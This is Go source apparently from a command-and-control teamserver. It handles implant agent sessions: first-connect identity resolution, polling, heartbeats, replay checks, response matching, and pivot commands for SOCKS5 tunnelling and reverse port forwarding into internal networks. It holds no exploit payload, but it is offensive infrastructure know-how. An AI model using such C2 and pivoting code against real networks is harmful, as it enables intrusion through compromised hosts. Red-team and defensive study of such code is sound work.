package session

import (
	"encoding/json"
	"time"

	"cleat/teamserver/internal/logx"
)

// Agent 主动消息命令常量(协议对齐旧 Server / protocol.go)。
const (
	CmdFirstConnect  = "FirstConnect"
	CmdPoll          = "Poll"
	CmdHeartbeatPing = "HeartbeatPing"
	CmdEventReport   = "EventReport"
	CmdExitProgram   = "ExitProgram"
)

// Pivot 转发命令常量(协议对齐旧 Server / protocol.go, Agent 侧 Cmd::Pivot)。
const (
	CmdPivotStart  = "PivotStart"  // S→A: 建立到内网目标的新连接
	CmdPivotData   = "PivotData"   // 双向: 代理数据(混合帧; S→A 带二进制体)
	CmdPivotClose  = "PivotClose"  // 双向: 关闭 pivot 连接
	CmdPivotListen = "PivotListen" // S→A: 启动多跳入口(SOCKS5)

	CmdPivotRportfwdAdd = "PivotRportfwdAdd" // S→A: 反向端口转发监听(Agent 监听→流量送 Server)
	CmdPivotRportfwdDel = "PivotRportfwdDel" // S→A: 停止反向端口转发监听
	CmdPivotOpened      = "PivotOpened"      // A→S: rportfwd 入站连接已接受(虚拟连接开通通告)
	CmdPivotListenPipe  = "PivotListenPipe"  // S→A: 开会话借道入口(pipe_name + 配对密钥, P1')
	CmdPivotPipeStop    = "PivotPipeStop"    // S→A: 关会话借道入口
)

// replayWindow 帧时间戳允许偏差(秒)。Agent 侧 FrameBuilder 统一在明文帧注入 "ts";
// 缺失或超出窗口的帧判定为重放/伪造, 直接丢弃。双向对称: 服务器下发帧同样带 ts
// (Agent 不校验, 仅保持协议自洽)。
const replayWindow = 120

// checkReplay 校验帧时间戳: 通过返回 true。
func checkReplay(msg map[string]interface{}) bool {
	ts, ok := msg["ts"].(float64)
	if !ok {
		return false
	}
	now := float64(time.Now().Unix())
	return now-ts <= replayWindow && ts-now <= replayWindow
}

// handleOne 处理一帧已解密的消息(由 Manager 的 runLoop 调用)。
// 返回 (next, switched): 复用旧会话时 switched=true 且 next=旧会话(连接已转交,
// 调用方应用 next 继续读); 否则 switched=false, next=s(本会话继续)。
func (s *Session) handleOne(body []byte, mgr *Manager) (*Session, bool) {
	// 帧拆分唯一入口(SplitFrame): 纯 JSON 与混合帧(JSON头 + '\0' + 二进制体)
	// 的形状判定收敛到 wire.go 单点, 此处只消费结构化结果
	header, binary, err := SplitFrame(body)
	if err != nil {
		logx.Printf("[-] 会话 #%d 帧解析失败: %v\n", s.ID(), err)
		return s, false
	}
	var msg map[string]interface{}
	if err := json.Unmarshal(header, &msg); err != nil {
		logx.Printf("[-] 会话 #%d 帧头不是 JSON 对象: %v\n", s.ID(), err)
		return s, false
	}

	// 防重放: 校验帧时间戳(Agent FrameBuilder 统一注入)。缺失/超窗直接丢弃。
	if !checkReplay(msg) {
		logx.Printf("[-] 会话 #%d 丢弃无时间戳/超窗帧(疑似重放)\n", s.ID())
		return s, false
	}

	// 身份待定(pending, ID==0): 首条主动消息解析身份(注册/复用)
	if s.Record.ID == 0 {
		if cmd, ok := msg["cmd"].(string); ok {
			signedOver, err := mgr.ResolveIdentity(s, cmd, msg)
			if err != nil {
				return s, false // 身份解析失败/拒绝, runLoop 会因连接关闭退出
			}
			if signedOver {
				// 复用旧会话: 返回旧会话, 由 runLoop 用它继续读同一连接
				old := mgr.sessionByID(s.Record.ID)
				if old != nil {
					return old, true
				}
				return s, false
			}
		}
		return s, false
	}

	if cmd, ok := msg["cmd"].(string); ok {
		mgr.Dispatch(s, cmd, msg, binary)
		return s, false
	}

	// 命令响应: 按 request_id 精确匹配 PendingResp —— 唯一语义(节拍合一 S3.5,
	// 原"无匹配投 RespChan FIFO"兜底已删)。无 rid 或无在途等待者 → 丢弃:
	// 常态如 SendHybridPush 的 Ok 回执(带 rid 无人等), 终局与原"落 RespChan 被 drain 清掉"一致。
	if rid, ok := msg["request_id"].(string); ok && rid != "" {
		s.pendingMu.Lock()
		ch := s.PendingResp[rid]
		s.pendingMu.Unlock()
		if ch != nil {
			select {
			case ch <- body:
			default:
			}
			return s, false
		}
		// 若任务状态恰为 timeout 则单向复活为真实终态(慢通道长节拍下的真实痛点)。
		// 复活内部有状态 CAS 与终态过滤(superseded/pending 等不复活), 常态命中失败
		// 静默返回, 开销 = 一次 store 线性查(仅此丢弃路径触发, 热路径不走这里)。
		if mgr != nil {
			mgr.reviveLateResponse(rid, body)
		}
	}
	return s, false
}
